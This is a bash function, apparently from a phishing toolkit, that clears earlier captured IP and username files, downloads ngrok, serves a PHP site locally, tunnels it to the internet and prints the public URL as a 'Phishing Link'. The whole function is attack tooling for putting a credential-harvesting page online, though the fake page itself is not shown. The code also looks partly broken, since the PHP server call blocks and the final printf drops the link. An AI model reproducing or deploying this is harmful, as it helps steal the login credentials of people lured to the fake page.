start_server() {
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt

fi


if [[ -e ngrok ]]; then
echo ""
else

printf "${green}Downloading Ngrok...${reset}\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "${red}CRITICAL ERROR! ABORTING! (Err: UNABLE TO DOWNLOAD Ngrok)${reset} \n"
exit 1
fi



else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "${red}CRITICAL ERROR! ABORTING! (Err: UNABLE TO DOWNLOAD Ngrok)${reset} \n"
exit 1
fi
fi
fi

printf "${green}Starting Personal Home Page (PHP)...${reset} \n"
cd sites/$site && php -S 127.0.0.1:$port
sleep 2
printf "${green}Starting ngrok...${reset} \n"
./ngrok http $port
sleep 10

link=$( curl -S -n http://127.0.0.1:4040/api/tunnels | grep -oE "https:\/\/[a-z0-9\-]*\.ngrok\.io")
printf "${green}Phishing Link: \n" $link
check
}
